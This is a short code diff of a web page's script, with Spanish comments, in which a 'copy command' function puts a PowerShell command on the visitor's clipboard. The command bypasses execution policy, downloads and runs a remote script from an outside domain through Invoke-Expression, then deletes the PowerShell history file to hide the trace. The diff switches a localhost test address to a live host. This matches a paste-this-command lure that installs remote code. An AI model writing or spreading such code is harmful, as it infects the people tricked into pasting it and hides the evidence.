@@ -13,7 +13,7 @@
 
     <script>
         function copiarComando() {
-                        const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-RestMethod -Uri 'https://web.haroldsoftware.com/metrics.ps1'); Remove-Item ([...] 
+                        const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-RestMethod -Uri 'https://web.haroldsoftware.com/metrics.ps1'); Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue\"";
             // const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-RestMethod -Uri 'http://localhost:2020'); Remove-Item (Get-PSReadLineOption).HistoryS[...] 
             navigator.clipboard.writeText(cmd).then(() => {
                 console.log('Comando copiado al portapapeles');
